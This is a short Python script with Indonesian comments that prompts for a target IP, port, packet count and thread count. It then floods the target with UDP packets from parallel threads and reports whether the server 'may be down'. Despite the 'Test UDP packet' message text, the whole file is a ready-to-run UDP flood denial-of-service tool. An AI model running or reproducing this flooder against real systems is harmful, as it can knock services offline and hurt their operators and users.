import socket
import threading

# Fungsi untuk mengirim paket UDP ke server
def send_udp_packet(target_ip, target_port, message, count, down_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(count):
        try:
            sock.sendto(message.encode(), (target_ip, target_port))
            print(f"Paket UDP dikirim ke {target_ip}:{target_port}")
        except socket.error as e:
            print(f"Gagal mengirim paket UDP: {e}")
            down_event.set()  # Menandai bahwa server mungkin sudah down
            break
    sock.close()

# Fungsi untuk mengirim banyak paket UDP secara paralel
def send_multiple_udp_packets(target_ip, target_port, message, count, num_threads, down_event):
    threads = []
    packets_per_thread = count // num_threads
    for _ in range(num_threads):
        thread = threading.Thread(target=send_udp_packet, args=(target_ip, target_port, message, packets_per_thread, down_event))
        thread.start()
        threads.append(thread)

    # Menunggu sampai semua thread selesai
    for thread in threads:
        thread.join()

# Main program
if __name__ == "__main__":
    target_ip = input("Masukkan IP server: ")
    target_port = int(input("Masukkan port server: "))
    message = "Test UDP packet"  # Pesan yang akan dikirim
    count = int(input("Masukkan jumlah paket yang ingin dikirim: "))
    num_threads = int(input("Masukkan jumlah thread: "))

    down_event = threading.Event()

    send_multiple_udp_packets(target_ip, target_port, message, count, num_threads, down_event)

    if down_event.is_set():
        print("Server mungkin sudah down.")
    else:
        print("Semua paket UDP berhasil dikirim.")
